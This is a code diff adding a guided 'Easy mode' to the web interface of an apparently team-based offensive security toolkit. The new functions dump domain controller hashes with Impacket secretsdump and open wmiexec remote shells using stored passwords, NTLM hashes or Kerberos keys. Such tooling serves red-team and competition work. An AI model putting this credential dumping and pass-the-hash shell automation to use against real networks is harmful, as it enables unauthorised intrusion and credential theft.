@@ -148,7 +148,14 @@
     notes: string;
   }
 
-  type TabId = "main" | "command" | "notes" | "credentials";
+  interface EasyModeState {
+    teamName: string;
+    dcTargetId: string;
+    shellTargetId: string;
+    credentialId: string;
+  }
+
+  type TabId = "main" | "easy" | "command" | "notes" | "credentials";
   type ImpacketTool = "secretsdump" | "getTGT" | "ticketer" | "wmiexec" | "smbexec" | "dcomexec";
   const BACKEND_URL = "http://localhost:8080";
   const IMPACKET_STYLE_KEY = "cfc-tk.impacketCommandStyle";
@@ -191,6 +198,13 @@
   let commandError = $state("");
   let commandCopied = $state(false);
   let lastLoadedCommandTeam = $state("");
+  let easyTargets = $state<Target[]>([]);
+  let easyCredentials = $state<Credential[]>([]);
+  let easyLoading = $state(false);
+  let easyRunning = $state(false);
+  let easyError = $state("");
+  let easyOutput = $state("");
+  let lastLoadedEasyTeam = $state("");
   let lastLoadedCredentialTeam = $state("");
   let impacketPreferenceReady = $state(false);
   let commandForm = $state<CommandForm>({
@@ -244,9 +258,16 @@
     host: "",
     ip: ""
   });
+  let easyMode = $state<EasyModeState>({
+    teamName: "",
+    dcTargetId: "",
+    shellTargetId: "",
+    credentialId: ""
+  });
 
   const tabs: { id: TabId; label: string; eyebrow: string }[] = [
     { id: "main", label: "Main", eyebrow: "ops" },
+    { id: "easy", label: "Easy", eyebrow: "guided" },
     { id: "command", label: "Command", eyebrow: "run" },
     { id: "notes", label: "Notes", eyebrow: "field" },
     { id: "credentials", label: "Credentials", eyebrow: "vault" }
@@ -293,6 +314,82 @@
     }
     return selectedCommandTarget?.ip || selectedCommandTarget?.hostname || "";
   });
+  const selectedEasyDc = $derived(
+    easyTargets.find((target) => String(target.id) === easyMode.dcTargetId)
+  );
+  const selectedEasyShellTarget = $derived(
+    easyTargets.find((target) => String(target.id) === easyMode.shellTargetId)
+  );
+  const easyCredentialOptions = $derived.by(() =>
+    easyCredentials.filter(
+      (credential) =>
+        credential.username.toLowerCase() !== "krbtgt" &&
+        (credential.secretType === "password" ||
+          credential.secretType === "ntlm" ||
+          credential.secretType === "kerberos-ntlm" ||
+          credential.secretType.includes("aes"))
+    )
+  );
+  const selectedEasyCredential = $derived(
+    easyCredentialOptions.find((credential) => String(credential.id) === easyMode.credentialId)
+  );
+  const targetFqdn = (target: Target | undefined) => {
+    if (!target) return "";
+    const hostname = target.hostname.trim();
+    const domainName = target.domainName.trim();
+    if (hostname && domainName && !hostname.includes(".")) {
+      return `${hostname}.${domainName}`;
+    }
+    return hostname || target.ip;
+  };
+  const easyDcFqdn = $derived(targetFqdn(selectedEasyDc));
+  const easyShellTargetFqdn = $derived(targetFqdn(selectedEasyShellTarget));
+  const easyShellTargetAddress = $derived(selectedEasyShellTarget?.ip || selectedEasyShellTarget?.hostname || "");
+  const easyDomainName = $derived(selectedEasyDc?.domainName || selectedEasyCredential?.domain || "");
+
+  const credentialToAuth = (credential: Credential | undefined) => {
+    if (!credential) {
+      return {
+        authMode: "hash",
+        password: "",
+        lmHash: "",
+        ntHash: "",
+        aesKey: ""
+      };
+    }
+
+    const [lmHash, ntHash] = credential.secret.includes(":")
+      ? credential.secret.split(":", 2)
+      : ["", credential.secret];
+
+    if (credential.secretType === "password") {
+      return {
+        authMode: "password",
+        password: credential.secret,
+        lmHash: "",
+        ntHash: "",
+        aesKey: ""
+      };
+    }
+
+    if (credential.secretType === "ntlm" || credential.secretType === "kerberos-ntlm") {
+      return {
+        authMode: "hash",
+        password: "",
+        lmHash,
+        ntHash,
+        aesKey: ""
+      };
+    }
+
+    return {
+      authMode: "kerberos",
+      password: "",
+      lmHash: "",
+      ntHash: "",
+      aesKey: credential.secret
+    };
+  };
 
   const readError = async (response: Response, fallback: string) => {
     const body = await response.text().catch(() => "");
@@ -546,6 +643,40 @@
     }
   };
 
+  const loadEasyModeData = async (teamName: string) => {
+    easyLoading = true;
+    easyError = "";
+
+    try {
+      const [targetsResponse, credentialsResponse] = await Promise.all([
+        fetch(`${BACKEND_URL}/api/teams/${encodeURIComponent(teamName)}/targets`),
+        fetch(`${BACKEND_URL}/api/teams/${encodeURIComponent(teamName)}/credentials`)
+      ]);
+
+      if (!targetsResponse.ok) {
+        easyError = await readError(targetsResponse, "Could not load Easy Mode targets.");
+        easyTargets = [];
+        easyCredentials = [];
+        return;
+      }
+      if (!credentialsResponse.ok) {
+        easyError = await readError(credentialsResponse, "Could not load Easy Mode credentials.");
+        easyTargets = [];
+        easyCredentials = [];
+        return;
+      }
+
+      easyTargets = (await targetsResponse.json()) as Target[];
+      easyCredentials = (await credentialsResponse.json()) as Credential[];
+    } catch (error) {
+      easyError = error instanceof Error ? error.message : "Could not load Easy Mode data.";
+      easyTargets = [];
+      easyCredentials = [];
+    } finally {
+      easyLoading = false;
+    }
+  };
+
   const loadDomains = async (teamName: string) => {
     domainsLoading = true;
     domainError = "";
@@ -634,6 +765,9 @@
       commandForm = { ...commandForm, teamName: "", targetId: "" };
       commandTargets = [];
       kerberosCaches = [];
+      easyMode = { teamName: "", dcTargetId: "", shellTargetId: "", credentialId: "" };
+      easyTargets = [];
+      easyCredentials = [];
       selectedCredentialTeam = "";
       credentials = [];
       return;
@@ -645,6 +779,10 @@
 
     if (!commandForm.teamName || !teams.some((team) => team.name === commandForm.teamName)) {
       commandForm = { ...commandForm, teamName: teams[0].name, targetId: "" };
+    }
+
+    if (!easyMode.teamName || !teams.some((team) => team.name === easyMode.teamName)) {
+      easyMode = { ...easyMode, teamName: teams[0].name, dcTargetId: "", shellTargetId: "", credentialId: "" };
     }
 
     if (!selectedCredentialTeam || !teams.some((team) => team.name === selectedCredentialTeam)) {
@@ -676,6 +814,14 @@
     void loadKerberosCaches(commandForm.teamName);
     void loadCommandCredentials(commandForm.teamName);
     commandForm = { ...commandForm, targetId: "", manualTarget: "" };
+  });
+
+  $effect(() => {
+    if (!easyMode.teamName) return;
+    if (easyMode.teamName === lastLoadedEasyTeam) return;
+    lastLoadedEasyTeam = easyMode.teamName;
+    easyMode = { ...easyMode, dcTargetId: "", shellTargetId: "", credentialId: "" };
+    void loadEasyModeData(easyMode.teamName);
   });
 
   $effect(() => {
@@ -969,6 +1115,9 @@
       if (commandForm.teamName === selectedTeam) {
         await loadCommandTargets(selectedTeam);
       }
+      if (easyMode.teamName === selectedTeam) {
+        await loadEasyModeData(selectedTeam);
+      }
     } catch (error) {
       targetError = error instanceof Error ? error.message : "Could not add target.";
     } finally {
@@ -1005,6 +1154,14 @@
       }
       if (commandForm.targetId === String(target.id)) {
         commandForm = { ...commandForm, targetId: "", manualTarget: "" };
+      }
+      if (easyMode.teamName === selectedTeam) {
+        await loadEasyModeData(selectedTeam);
+        easyMode = {
+          ...easyMode,
+          dcTargetId: easyMode.dcTargetId === String(target.id) ? "" : easyMode.dcTargetId,
+          shellTargetId: easyMode.shellTargetId === String(target.id) ? "" : easyMode.shellTargetId
+        };
       }
     } catch (error) {
       targetError = error instanceof Error ? error.message : "Could not delete target.";
@@ -1337,6 +1494,139 @@
       commandRunning = false;
     }
   };
+
+  const handleEasyDumpHashes = async () => {
+    easyError = "";
+    easyOutput = "";
+
+    if (!easyMode.teamName) {
+      easyError = "Select a team first.";
+      return;
+    }
+    if (!selectedEasyDc) {
+      easyError = "Pick the domain controller to dump.";
+      return;
+    }
+    if (!selectedEasyCredential) {
+      easyError = "Pick a credential.";
+      return;
+    }
+
+    const auth = credentialToAuth(selectedEasyCredential);
+    const target = auth.authMode === "kerberos" ? easyDcFqdn : selectedEasyDc.ip;
+    const domain = easyDomainName;
+
+    easyRunning = true;
+    try {
+      const response = await fetch(
+        `${BACKEND_URL}/api/teams/${encodeURIComponent(easyMode.teamName)}/secretsdump/run`,
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            toolCommand: impacketToolName("secretsdump"),
+            target,
+            domain,
+            username: selectedEasyCredential.username,
+            authMode: auth.authMode,
+            password: auth.password,
+            lmHash: auth.lmHash,
+            ntHash: auth.ntHash,
+            aesKey: auth.aesKey,
+            kdcHost: selectedEasyDc.ip,
+            useKerberosCache: false,
+            cachePath: "",
+            justDc: true,
+            useVss: false
+          })
+        }
+      );
+
+      if (!response.ok) {
+        easyError = await readError(response, "Could not dump hashes.");
+        return;
+      }
+
+      const result = (await response.json()) as RunSecretsdumpResponse;
+      easyOutput = [
+        result.output || "secretsdump completed.",
+        "",
+        `Imported ${result.credentials.length} credential${result.credentials.length === 1 ? "" : "s"}.`
+      ].join("\n");
+      await loadEasyModeData(easyMode.teamName);
+      if (selectedCredentialTeam === easyMode.teamName) {
+        await loadCredentials(selectedCredentialTeam);
+      }
+      if (commandForm.teamName === easyMode.teamName) {
+        await loadCommandCredentials(easyMode.teamName);
+      }
+    } catch (error) {
+      easyError = error instanceof Error ? error.message : "Could not dump hashes.";
+    } finally {
+      easyRunning = false;
+    }
+  };
+
+  const handleEasyLaunchWmiexec = async () => {
+    easyError = "";
+    easyOutput = "";
+
+    if (!easyMode.teamName) {
+      easyError = "Select a team first.";
+      return;
+    }
+    if (!selectedEasyShellTarget) {
+      easyError = "Pick a shell target.";
+      return;
+    }
+    if (!selectedEasyCredential) {
+      easyError = "Pick a credential.";
+      return;
+    }
+
+    const auth = credentialToAuth(selectedEasyCredential);
+    const target = auth.authMode === "kerberos" ? easyShellTargetFqdn : easyShellTargetAddress;
+
+    easyRunning = true;
+    try {
+      const response = await fetch(
+        `${BACKEND_URL}/api/teams/${encodeURIComponent(easyMode.teamName)}/interactive/launch`,
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            commandKind: "wmiexec",
+            dcomObject: "",
+            toolCommand: impacketToolName("wmiexec"),
+            target,
+            targetLabel: selectedEasyShellTarget.hostname || selectedEasyShellTarget.ip,
+            domain: easyDomainName,
+            username: selectedEasyCredential.username,
+            authMode: auth.authMode,
+            password: auth.password,
+            lmHash: auth.lmHash,
+            ntHash: auth.ntHash,
+            aesKey: auth.aesKey,
+            kdcHost: selectedEasyDc?.ip || "",
+            useKerberosCache: false,
+            cachePath: ""
+          })
+        }
+      );
+
+      if (!response.ok) {
+        easyError = await readError(response, "Could not launch wmiexec.");
+        return;
+      }
+
+      const result = (await response.json()) as LaunchInteractiveCommandResponse;
+      easyOutput = `Launched ${result.title} in ${result.terminal}. cfc-tk is not tracking this shell.`;
+    } catch (error) {
+      easyError = error instanceof Error ? error.message : "Could not launch wmiexec.";
+    } finally {
+      easyRunning = false;
+    }
+  };
 </script>
 
 <svelte:head>
@@ -1650,6 +1940,150 @@
             </form>
           </div>
           </aside>
+        </section>
+      {:else if activeTab === "easy"}
+        <section class="grid min-w-0 gap-5 xl:grid-cols-[minmax(0,420px)_minmax(0,1fr)]">
+          <div class="min-w-0 rounded-md border border-white/10 bg-[#0d1316]/90 p-5">
+            <ShieldCheck class="h-6 w-6 text-lime-100" />
+            <h2 class="mt-4 text-xl font-semibold text-white">Easy mode</h2>
+            <p class="mt-2 text-sm leading-6 text-white/60">
+              Pick the pieces, then run the common moves without rebuilding the command form.
+            </p>
+
+            <div class="mt-6 grid gap-3">
+              <label class="grid gap-2">
+                <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Team</span>
+                <select
+                  bind:value={easyMode.teamName}
+                  class="rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-lime-200/45"
+                  disabled={teams.length === 0 || easyRunning}
+                >
+                  {#each teams as team (team.name)}
+                    <option class="bg-[#0d1316]" value={team.name}>{team.name}</option>
+                  {/each}
+                </select>
+              </label>
+
+              <label class="grid gap-2">
+                <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Domain controller</span>
+                <select
+                  bind:value={easyMode.dcTargetId}
+                  class="rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-lime-200/45"
+                  disabled={easyTargets.length === 0 || easyRunning}
+                >
+                  <option class="bg-[#0d1316]" value="">Pick DC</option>
+                  {#each easyTargets as target (target.id)}
+                    <option class="bg-[#0d1316]" value={String(target.id)}>
+                      {target.hostname} / {target.ip}{target.domainName ? ` / ${target.domainName}` : ""}
+                    </option>
+                  {/each}
+                </select>
+              </label>
+
+              <label class="grid gap-2">
+                <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Credential</span>
+                <select
+                  bind:value={easyMode.credentialId}
+                  class="rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-lime-200/45"
+                  disabled={easyCredentialOptions.length === 0 || easyRunning}
+                >
+                  <option class="bg-[#0d1316]" value="">Pick credential</option>
+                  {#each easyCredentialOptions as credential (credential.id)}
+                    <option class="bg-[#0d1316]" value={String(credential.id)}>
+                      {credential.domain ? `${credential.domain}\\` : ""}{credential.username} / {credential.secretType}
+                    </option>
+                  {/each}
+                </select>
+              </label>
+
+              <label class="grid gap-2">
+                <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Shell target</span>
+                <select
+                  bind:value={easyMode.shellTargetId}
+                  class="rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-lime-200/45"
+                  disabled={easyTargets.length === 0 || easyRunning}
+                >
+                  <option class="bg-[#0d1316]" value="">Pick target</option>
+                  {#each easyTargets as target (target.id)}
+                    <option class="bg-[#0d1316]" value={String(target.id)}>
+                      {target.hostname} / {target.ip}{target.domainName ? ` / ${target.domainName}` : ""}
+                    </option>
+                  {/each}
+                </select>
+              </label>
+            </div>
+          </div>
+
+          <div class="min-w-0 rounded-md border border-white/10 bg-white/[0.035] p-5">
+            <div class="flex flex-col gap-3 sm:flex-row sm:items-start sm:justify-between">
+              <div>
+                <p class="text-xs font-semibold uppercase tracking-[0.22em] text-lime-200/60">Actions</p>
+                <h2 class="mt-2 text-xl font-semibold text-white">{easyMode.teamName || "No team selected"}</h2>
+              </div>
+              <div class="rounded-md border border-white/10 bg-black/20 px-3 py-2 text-sm text-white/55">
+                {easyCredentialOptions.length} creds / {easyTargets.length} targets
+              </div>
+            </div>
+
+            {#if easyLoading}
+              <p class="mt-5 rounded-md border border-white/10 bg-black/20 px-3 py-2 text-sm text-white/55">Loading Easy Mode data...</p>
+            {/if}
+            {#if easyError}
+              <p class="mt-5 rounded-md border border-rose-300/20 bg-rose-300/10 px-3 py-2 text-sm text-rose-100">{easyError}</p>
+            {/if}
+
+            <div class="mt-5 grid gap-3 lg:grid-cols-2">
+              <div class="rounded-md border border-white/10 bg-black/20 p-4">
+                <p class="text-xs font-semibold uppercase tracking-[0.22em] text-lime-200/60">Dump</p>
+                <h3 class="mt-2 text-lg font-semibold text-white">Dump DC hashes</h3>
+                <p class="mt-2 text-sm leading-6 text-white/55">
+                  Runs secretsdump with <code class="rounded bg-black/30 px-1 text-teal-100">-just-dc</code> against the picked DC and imports results.
+                </p>
+                <Button
+                  type="button"
+                  disabled={easyRunning || !selectedEasyDc || !selectedEasyCredential}
+                  class="mt-4 bg-lime-200 text-slate-950 hover:bg-lime-100"
+                  onclick={handleEasyDumpHashes}
+                >
+                  {easyRunning ? "Working..." : "Dump hashes"}
+                </Button>
+              </div>
+
+              <div class="rounded-md border border-white/10 bg-black/20 p-4">
+                <p class="text-xs font-semibold uppercase tracking-[0.22em] text-lime-200/60">Shell</p>
+                <h3 class="mt-2 text-lg font-semibold text-white">Open wmiexec</h3>
+                <p class="mt-2 text-sm leading-6 text-white/55">
+                  Launches a local terminal with the picked credential and shell target.
+                </p>
+                <Button
+                  type="button"
+                  disabled={easyRunning || !selectedEasyShellTarget || !selectedEasyCredential}
+                  class="mt-4 bg-teal-200 text-slate-950 hover:bg-teal-100"
+                  onclick={handleEasyLaunchWmiexec}
+                >
+                  {easyRunning ? "Working..." : "Open shell"}
+                </Button>
+              </div>
+            </div>
+
+            <div class="mt-5 grid gap-3 text-sm text-white/60">
+              <div class="rounded-md border border-white/10 bg-black/20 p-4">
+                <p class="text-xs font-semibold uppercase tracking-[0.22em] text-white/45">Selected context</p>
+                <div class="mt-3 grid gap-2 font-mono text-xs text-white/65">
+                  <span>DC: {selectedEasyDc ? `${easyDcFqdn} (${selectedEasyDc.ip})` : "not selected"}</span>
+                  <span>Shell target: {selectedEasyShellTarget ? `${selectedEasyShellTarget.hostname || selectedEasyShellTarget.ip} (${selectedEasyShellTarget.ip})` : "not selected"}</span>
+                  <span>Credential: {selectedEasyCredential ? `${selectedEasyCredential.domain ? `${selectedEasyCredential.domain}\\` : ""}${selectedEasyCredential.username} / ${selectedEasyCredential.secretType}` : "not selected"}</span>
+                </div>
+              </div>
+            </div>
+
+            {#if easyOutput}
+              <div class="mt-4">
+                <p class="text-xs font-semibold uppercase tracking-[0.22em] text-lime-200/60">Last result</p>
+                <pre class="mt-2 max-h-72 overflow-auto whitespace-pre-wrap rounded-md border border-white/10 bg-black/35 p-4 font-mono text-xs leading-5 text-white/70">{easyOutput}</pre>
+              </div>
+            {/if}
+          </div>
         </section>
       {:else if activeTab === "command"}
         <section class="grid min-w-0 gap-5 xl:grid-cols-[minmax(0,440px)_minmax(0,1fr)]">
